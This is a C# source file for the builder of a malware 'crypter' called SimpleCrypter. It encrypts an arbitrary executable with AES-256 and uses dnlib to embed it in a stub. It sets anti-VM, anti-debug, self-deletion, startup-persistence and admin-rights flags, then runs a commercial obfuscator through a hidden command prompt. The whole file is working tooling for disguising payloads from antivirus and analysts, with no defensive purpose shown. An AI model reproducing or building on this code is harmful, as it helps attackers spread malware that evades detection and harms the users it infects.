using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace SimpleCrypter
{
    internal class Build
    {

        public static byte[] key_c = { };
        public static byte[] iv_c = { };
        private static Instruction GetInstruction(bool value)
        {
            if (value)
                return Instruction.Create(OpCodes.Ldc_I4_1);
            else
                return Instruction.Create(OpCodes.Ldc_I4_0);
        }
        public static void BuildStub(string filepath_b, bool net_b, bool antivm_b, bool antidebug_b, bool melt_b, bool admin_b, bool startup_b, bool obfuscation)
        {
            key_c = GenerateRandomBytes(32);
            iv_c = GenerateRandomBytes(16);

            byte[] fileBytes = File.ReadAllBytes(filepath_b);
            byte[] encryptedBytes = Encrypt(fileBytes, key_c, iv_c);

            string rootDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string filePath = Path.Combine(rootDirectory, "Stub", "Stub.exe");

            if (!File.Exists(filePath))
            {
                return;
            }

            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string randomFileName = GenerateRandomCode() + ".exe";
            string newFilePath = Path.Combine(desktopPath, randomFileName);

            try
            {
                ModuleContext modCtx = ModuleDef.CreateModuleContext();
                var module = ModuleDefMD.Load(filePath, modCtx);
                var programType = module.Types.FirstOrDefault(t => t.Name == "Program" && t.Namespace == "Stub");
                if (programType == null)
                {
                    return;
                }

                var antivm = programType.Fields.FirstOrDefault(f => f.Name == "antivm");
                if (antivm == null)
                {
                    return;
                }

                var melt = programType.Fields.FirstOrDefault(f => f.Name == "melt");
                if (melt == null)
                {
                    return;
                }

                var startup = programType.Fields.FirstOrDefault(f => f.Name == "startup");
                if (startup == null)
                {
                    return;
                }

                var adminrights = programType.Fields.FirstOrDefault(f => f.Name == "adminrights");
                if (adminrights == null)
                {
                    return;
                }

                var antidebug = programType.Fields.FirstOrDefault(f => f.Name == "antidebug");
                if (antidebug == null)
                {
                    return;
                }

                var net = programType.Fields.FirstOrDefault(f => f.Name == "net");
                if (net == null)
                {
                    return;
                }

                var key = programType.Fields.FirstOrDefault(f => f.Name == "key");
                if (key == null)
                {
                    return;
                }

                var iv = programType.Fields.FirstOrDefault(f => f.Name == "iv");
                if (iv == null)
                {
                    return;
                }

                var payload = programType.Fields.FirstOrDefault(f => f.Name == "payload");
                if (payload == null)
                {
                    return;
                }

                var constructor = programType.Methods.FirstOrDefault(m => m.Name == ".cctor");
                if (constructor == null)
                {
                    return;
                }

                var code = constructor.Body.Instructions;
                code.Clear();



                var instructions = new List<Instruction>
                {
                    Instruction.Create(OpCodes.Nop),
                    GetInstruction(antivm_b),
                    Instruction.Create(OpCodes.Stsfld, antivm),
                    GetInstruction(melt_b),
                    Instruction.Create(OpCodes.Stsfld, melt),
                    GetInstruction(startup_b),
                    Instruction.Create(OpCodes.Stsfld, startup),
                    GetInstruction(admin_b),
                    Instruction.Create(OpCodes.Stsfld, adminrights),
                    GetInstruction(antidebug_b),
                    Instruction.Create(OpCodes.Stsfld, antidebug),
                    GetInstruction(net_b),
                    Instruction.Create(OpCodes.Stsfld, net),
                    Instruction.Create(OpCodes.Nop)
                };


                instructions.Add(Instruction.Create(OpCodes.Ldc_I4, key_c.Length));
                instructions.Add(Instruction.Create(OpCodes.Newarr, module.CorLibTypes.Byte));

                for (int i = 0; i < key_c.Length; i++)
                {
                    instructions.Add(Instruction.Create(OpCodes.Dup));
                    instructions.Add(Instruction.Create(OpCodes.Ldc_I4, i));
                    instructions.Add(Instruction.Create(OpCodes.Ldc_I4, (int)key_c[i]));
                    instructions.Add(Instruction.Create(OpCodes.Stelem_I1));
                }

                instructions.Add(Instruction.Create(OpCodes.Stsfld, key));
                instructions.Add(Instruction.Create(OpCodes.Nop));

                instructions.Add(Instruction.Create(OpCodes.Ldc_I4, iv_c.Length));
                instructions.Add(Instruction.Create(OpCodes.Newarr, module.CorLibTypes.Byte));

                for (int i = 0; i < iv_c.Length; i++)
                {
                    instructions.Add(Instruction.Create(OpCodes.Dup));
                    instructions.Add(Instruction.Create(OpCodes.Ldc_I4, i));
                    instructions.Add(Instruction.Create(OpCodes.Ldc_I4, (int)iv_c[i]));
                    instructions.Add(Instruction.Create(OpCodes.Stelem_I1));
                }

                instructions.Add(Instruction.Create(OpCodes.Stsfld, iv));

                instructions.Add(Instruction.Create(OpCodes.Nop));

                instructions.Add(Instruction.Create(OpCodes.Ldc_I4, encryptedBytes.Length));
                instructions.Add(Instruction.Create(OpCodes.Newarr, module.CorLibTypes.Byte));

                for (int i = 0; i < encryptedBytes.Length; i++)
                {
                    instructions.Add(Instruction.Create(OpCodes.Dup));
                    instructions.Add(Instruction.Create(OpCodes.Ldc_I4, i));
                    instructions.Add(Instruction.Create(OpCodes.Ldc_I4, (int)encryptedBytes[i]));
                    instructions.Add(Instruction.Create(OpCodes.Stelem_I1));
                }

                instructions.Add(Instruction.Create(OpCodes.Stsfld, payload));

                instructions.Add(Instruction.Create(OpCodes.Ret));

                foreach (var instruction in instructions)
                {
                    code.Add(instruction);
                }

                module.Write(newFilePath);

                if (Builder.iconpath != null)
                {
                    IconInjector.InjectIcon(newFilePath, Builder.iconpath);
                }

                string obfDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string obfPath = Path.Combine(obfDirectory, "Obfuscator", "dotNET_Reactor.Console.exe");

                string commandline_deb = $@"{obfPath} -licensed -file {newFilePath} -visualstyles 0 -antitamp 1 -anti_debug 1 -hide_calls 1 -hide_calls_internals 1 -control_flow 1 -flow_level 9 -nativeexe 1 -prejit 1 -resourceencryption 1 -virtualization 1 -necrobit 1 -necrobit_comp 1 -all_params 1 -obfuscate_public_types 1 ";
                string commandline_none = $@"{obfPath} -licensed -file {newFilePath} -visualstyles 0 -antitamp 1 -hide_calls 1 -hide_calls_internals 1 -control_flow 1 -flow_level 9 -nativeexe 1 -prejit 1 -resourceencryption 1 -virtualization 1 -necrobit 1 -necrobit_comp 1 -all_params 1 -obfuscate_public_types 1 ";

                string obf_line = null;

                if (antidebug_b)
                {
                    obf_line = commandline_deb;
                }
                else
                {
                    obf_line = commandline_none;
                }

                if (obfuscation)
                {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/C " + obf_line;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;

                    process.Start();

                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    File.Delete(newFilePath);
                }

                MessageBox.Show("Task completed successfully!", "SimpleCrypt");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Произошла ошибка: {ex.Message}");

                MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #region RandomNaming

        private static Random random = new Random();
        public static string GenerateRandomCode()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder code = new StringBuilder();

            for (int i = 0; i < 12; i++)
            {
                code.Append(chars[random.Next(chars.Length)]);
            }

            return code.ToString();
        }

        #endregion

        #region Encryption(AES-256)

        private static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.Close();
                    }
                    return ms.ToArray();
                }
            }
        }

        private static byte[] GenerateRandomBytes(int length)
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                byte[] randomBytes = new byte[length];
                rng.GetBytes(randomBytes);
                return randomBytes;
            }
        }

        #endregion
    }
}
